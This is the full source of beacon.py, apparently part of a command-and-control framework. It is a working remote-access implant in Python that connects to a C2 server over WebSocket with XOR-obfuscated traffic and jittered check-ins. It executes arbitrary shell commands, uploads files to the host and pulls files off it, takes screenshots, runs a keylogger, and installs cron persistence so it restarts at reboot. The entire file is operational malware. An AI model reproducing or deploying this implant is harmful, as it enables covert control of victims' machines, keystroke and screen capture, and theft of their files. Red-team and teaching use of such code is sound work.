"""
AngelaMos | 2026
beacon.py

Standalone implant that connects to the C2 server and executes tasks

Self-contained beacon implant. Connects to the server over WebSocket,
sends a REGISTER message with host metadata, then concurrently runs a
heartbeat loop and a task receive loop. Handles all C2 commands
locally (shell, sysinfo, proclist, upload, download, screenshot,
keylogging, persistence, sleep configuration) and sends results back.
Reconnects with exponential backoff on failure.

Key exports:
  BeaconConfig - runtime configuration dataclass
  main - async entry point for the beacon loop
"""

import asyncio
import base64
import io
import json
import logging
import os
import platform
import random
import socket
import subprocess
import threading
import uuid
from dataclasses import dataclass, field
from typing import Any

import psutil
import websockets
from websockets.asyncio.client import connect

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s",
)
logger = logging.getLogger("beacon")


@dataclass
class BeaconConfig:
    """
    Runtime configuration for the beacon implant
    """

    server_url: str = os.environ.get("C2_SERVER_URL",
                                     "ws://localhost:8000/ws/beacon")
    xor_key: str = os.environ.get("C2_XOR_KEY",
                                  "c2-beacon-default-key-change-me")
    sleep_interval: float = float(os.environ.get("C2_SLEEP", "3.0"))
    jitter_percent: float = float(os.environ.get("C2_JITTER", "0.3"))
    reconnect_base: float = 2.0
    reconnect_max: float = 300.0
    beacon_id: str = field(default_factory=lambda: str(uuid.uuid4()))


config = BeaconConfig()

_keylog_buffer: list[str] = []
_keylog_listener: Any = None
_keylog_lock = threading.Lock()


def xor_bytes(data: bytes, key: bytes) -> bytes:
    """
    XOR each byte of data with a repeating key
    """
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def encode(payload: str, key: str) -> str:
    """
    Encode a plaintext payload: UTF-8 -> XOR -> Base64
    """
    raw = payload.encode("utf-8")
    xored = xor_bytes(raw, key.encode("utf-8"))
    return base64.b64encode(xored).decode("ascii")


def decode(encoded: str, key: str) -> str:
    """
    Decode an encoded payload: Base64 -> XOR -> UTF-8
    """
    xored = base64.b64decode(encoded)
    raw = xor_bytes(xored, key.encode("utf-8"))
    return raw.decode("utf-8")


def pack(msg_type: str, payload: dict[str, Any]) -> str:
    """
    Serialize and encode a protocol message
    """
    raw = json.dumps({"type": msg_type, "payload": payload})
    return encode(raw, config.xor_key)


def unpack(raw: str) -> dict[str, Any]:
    """
    Decode and deserialize a protocol message
    """
    decoded = decode(raw, config.xor_key)
    return json.loads(decoded)


def jittered_sleep() -> float:
    """
    Calculate sleep duration with random jitter applied
    """
    jitter = config.sleep_interval * config.jitter_percent
    return config.sleep_interval + random.uniform(-jitter, jitter)


def collect_system_info() -> dict[str, Any]:
    """
    Gather host metadata for beacon registration
    """
    return {
        "id": config.beacon_id,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        "pid": os.getpid(),
        "internal_ip": _get_internal_ip(),
        "arch": platform.machine(),
    }


def _get_internal_ip() -> str:
    """
    Determine the primary internal IP address via UDP socket trick
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("10.255.255.255", 1))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except OSError:
        return "127.0.0.1"


async def handle_shell(args: str | None) -> dict[str, Any]:
    """
    Execute a shell command and capture stdout/stderr
    """
    if not args:
        return {"output": None, "error": "No command provided"}

    proc = await asyncio.create_subprocess_shell(
        args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await proc.communicate()
    return {
        "output": stdout.decode("utf-8", errors="replace"),
        "error": stderr.decode("utf-8", errors="replace") or None,
    }


async def handle_sysinfo(_args: str | None) -> dict[str, Any]:
    """
    Collect detailed system information via psutil
    """
    mem = psutil.virtual_memory()
    disk_info = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disk_info.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_percent": usage.percent,
            })
        except PermissionError:
            continue

    net_info = {}
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                net_info[iface] = addr.address

    return {
        "output":
        json.dumps(
            {
                "os": f"{platform.system()} {platform.release()}",
                "hostname": socket.gethostname(),
                "username": os.getenv("USER", os.getenv("USERNAME",
                                                        "unknown")),
                "arch": platform.machine(),
                "cpu_count": psutil.cpu_count(),
                "cpu_percent": psutil.cpu_percent(interval=0.5),
                "memory_total_gb": round(mem.total / (1024**3), 2),
                "memory_available_gb": round(mem.available / (1024**3), 2),
                "memory_percent": mem.percent,
                "disks": disk_info,
                "network": net_info,
            },
            indent=2),
        "error":
        None,
    }


async def handle_proclist(_args: str | None) -> dict[str, Any]:
    """
    Enumerate running processes with resource usage
    """
    processes = []
    for proc in psutil.process_iter(["pid", "name", "username"]):
        try:
            info = proc.info
            processes.append({
                "pid": info["pid"],
                "name": info["name"],
                "username": info["username"] or "unknown",
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    return {
        "output": json.dumps(processes[:100], indent=2),
        "error": None,
    }


async def handle_upload(args: str | None) -> dict[str, Any]:
    """
    Receive a file from the server and write it to disk
    """
    if not args:
        return {"output": None, "error": "No upload data provided"}

    try:
        data = json.loads(args)
        filename = data["filename"]
        content = base64.b64decode(data["content"])
        dest = f"/tmp/{filename}"

        import aiofiles
        async with aiofiles.open(dest, "wb") as f:
            await f.write(content)

        return {
            "output": f"Written {len(content)} bytes to {dest}",
            "error": None
        }
    except (json.JSONDecodeError, KeyError) as exc:
        return {"output": None, "error": str(exc)}


async def handle_download(args: str | None) -> dict[str, Any]:
    """
    Read a file from disk and return its contents as base64
    """
    if not args:
        return {"output": None, "error": "No file path provided"}

    try:
        import aiofiles
        async with aiofiles.open(args, "rb") as f:
            content = await f.read()

        return {
            "output":
            json.dumps({
                "filename": os.path.basename(args),
                "content": base64.b64encode(content).decode("ascii"),
                "size": len(content),
            }),
            "error":
            None,
        }
    except FileNotFoundError:
        return {"output": None, "error": f"File not found: {args}"}
    except PermissionError:
        return {"output": None, "error": f"Permission denied: {args}"}


async def handle_screenshot(_args: str | None) -> dict[str, Any]:
    """
    Capture the screen and return it as a base64-encoded PNG
    """
    try:
        import mss

        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

        return {
            "output":
            json.dumps({
                "format": "png",
                "content": base64.b64encode(png_bytes).decode("ascii"),
                "width": screenshot.width,
                "height": screenshot.height,
            }),
            "error":
            None,
        }
    except Exception as exc:
        return {"output": None, "error": f"Screenshot failed: {exc}"}


async def handle_keylog_start(_args: str | None) -> dict[str, Any]:
    """
    Start a background keylogger thread using pynput
    """
    global _keylog_listener

    if _keylog_listener is not None:
        return {"output": "Keylogger already running", "error": None}

    try:
        from pynput import keyboard

        def on_press(key: Any) -> None:
            with _keylog_lock:
                try:
                    _keylog_buffer.append(key.char or "")
                except AttributeError:
                    _keylog_buffer.append(f"[{key.name}]")

        _keylog_listener = keyboard.Listener(on_press=on_press)
        _keylog_listener.start()
        return {"output": "Keylogger started", "error": None}
    except Exception as exc:
        return {"output": None, "error": f"Keylogger failed: {exc}"}


async def handle_keylog_stop(_args: str | None) -> dict[str, Any]:
    """
    Stop the keylogger and return captured keystrokes
    """
    global _keylog_listener

    if _keylog_listener is None:
        return {"output": "Keylogger not running", "error": None}

    _keylog_listener.stop()
    _keylog_listener = None

    with _keylog_lock:
        captured = "".join(_keylog_buffer)
        _keylog_buffer.clear()

    return {"output": captured, "error": None}


async def handle_persist(args: str | None) -> dict[str, Any]:
    """
    Install persistence via cron job on Linux systems
    """
    if platform.system() != "Linux":
        return {
            "output": None,
            "error": f"Persist not supported on {platform.system()}",
        }

    beacon_path = os.path.abspath(__file__)
    cron_entry = f"@reboot /usr/bin/python3 {beacon_path} &"

    try:
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True,
            check=False,
        )
        existing = result.stdout if result.returncode == 0 else ""

        if cron_entry in existing:
            return {"output": "Persistence already installed", "error": None}

        new_crontab = existing.rstrip() + "\n" + cron_entry + "\n"
        subprocess.run(
            ["crontab", "-"],
            input=new_crontab,
            text=True,
            check=True,
        )
        return {"output": "Cron persistence installed", "error": None}
    except Exception as exc:
        return {"output": None, "error": f"Persist failed: {exc}"}


async def handle_sleep(args: str | None) -> dict[str, Any]:
    """
    Update the beacon sleep interval and jitter percentage
    """
    if not args:
        return {
            "output":
            json.dumps({
                "interval": config.sleep_interval,
                "jitter": config.jitter_percent,
            }),
            "error":
            None,
        }

    try:
        data = json.loads(args)
        if "interval" in data:
            config.sleep_interval = float(data["interval"])
        if "jitter" in data:
            config.jitter_percent = float(data["jitter"])

        return {
            "output":
            json.dumps({
                "interval": config.sleep_interval,
                "jitter": config.jitter_percent,
            }),
            "error":
            None,
        }
    except (json.JSONDecodeError, ValueError) as exc:
        return {"output": None, "error": str(exc)}


COMMAND_HANDLERS = {
    "shell": handle_shell,
    "sysinfo": handle_sysinfo,
    "proclist": handle_proclist,
    "upload": handle_upload,
    "download": handle_download,
    "screenshot": handle_screenshot,
    "keylog_start": handle_keylog_start,
    "keylog_stop": handle_keylog_stop,
    "persist": handle_persist,
    "sleep": handle_sleep,
}


async def dispatch(command: str, args: str | None) -> dict[str, Any]:
    """
    Route a command to its handler function
    """
    handler = COMMAND_HANDLERS.get(command)
    if handler is None:
        return {"output": None, "error": f"Unknown command: {command}"}
    return await handler(args)


async def heartbeat_loop(ws: Any) -> None:
    """
    Send periodic heartbeat messages to maintain the connection
    """
    while True:
        try:
            msg = pack("HEARTBEAT", {"id": config.beacon_id})
            await ws.send(msg)
            await asyncio.sleep(jittered_sleep())
        except Exception:
            break


async def main() -> None:
    """
    Main beacon loop: connect, register, process tasks, reconnect on failure
    """
    backoff = config.reconnect_base

    while True:
        try:
            logger.info("Connecting to %s", config.server_url)

            async with connect(config.server_url) as ws:
                sysinfo = collect_system_info()
                await ws.send(pack("REGISTER", sysinfo))
                logger.info("Registered as %s", config.beacon_id)

                backoff = config.reconnect_base

                heartbeat_task = asyncio.create_task(heartbeat_loop(ws))

                try:
                    while True:
                        raw = await ws.recv()
                        message = unpack(raw)

                        if message.get("type") == "TASK":
                            payload = message["payload"]
                            task_id = payload["id"]
                            command = payload["command"]
                            args = payload.get("args")

                            logger.info("Executing: %s %s", command, args
                                        or "")
                            result = await dispatch(command, args)

                            response = pack(
                                "RESULT", {
                                    "task_id": task_id,
                                    "output": result.get("output"),
                                    "error": result.get("error"),
                                })
                            await ws.send(response)

                        await asyncio.sleep(jittered_sleep())
                finally:
                    heartbeat_task.cancel()

        except (
                ConnectionRefusedError,
                websockets.exceptions.ConnectionClosed,
                OSError,
        ) as exc:
            logger.warning("Connection lost: %s", exc)
            logger.info("Reconnecting in %.1fs", backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, config.reconnect_max)


if __name__ == "__main__":
    asyncio.run(main())
